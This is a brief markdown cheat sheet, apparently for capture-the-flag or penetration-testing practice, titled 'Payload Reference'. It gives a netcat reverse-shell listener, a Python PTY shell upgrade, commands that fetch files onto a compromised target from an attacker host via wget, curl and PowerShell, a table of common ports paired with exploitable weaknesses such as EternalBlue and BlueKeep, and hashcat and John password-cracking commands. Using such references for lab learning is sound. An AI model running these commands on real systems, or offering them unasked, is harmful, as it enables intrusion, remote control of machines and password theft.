# Payload Reference

## Reverse Shell Listener
```bash
nc -lvnp <port>
rlwrap nc -lvnp <port>  # better shell (arrows, tab)
```

## Python PTY Upgrade
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Then Ctrl+Z → `stty raw -echo; fg` → `export TERM=xterm`

## Web Transfer
```bash
# Python server
python3 -m http.server 80

# PHP server (if python not available)
php -S 0.0.0.0:80

# Download on target
wget http://<lhost>/file
curl -O http://<lhost>/file
powershell -c "Invoke-WebRequest -Uri http://<lhost>/file -OutFile file"
```

## Common CTF Ports
| Port | Service | Common Vulns |
|------|---------|-------------|
| 21   | FTP     | Anonymous login |
| 22   | SSH     | Weak creds, keys |
| 80   | HTTP    | Web vulns |
| 135  | RPC     | MS-RPC |
| 139  | NetBIOS | SMB |
| 389  | LDAP    | Anonymous bind |
| 443  | HTTPS   | Web vulns |
| 445  | SMB     | EternalBlue, null session |
| 1433 | MSSQL   | Weak sa password |
| 1521 | Oracle  | Default creds |
| 2049 | NFS     | No_root_squash |
| 3306 | MySQL   | Weak root password |
| 3389 | RDP     | BlueKeep, creds |
| 5432 | Postgres | Weak password |
| 6379 | Redis   | No auth, RCE |
| 27017 | MongoDB | No auth |

## Hash Cracking
```bash
# Identify hash
hashid <hash>

# MD5
hashcat -m 0 hash.txt wordlist.txt

# SHA1
hashcat -m 100 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt

# bcrypt
hashcat -m 3200 hash.txt wordlist.txt

# John
john hash.txt --wordlist=wordlist.txt
```
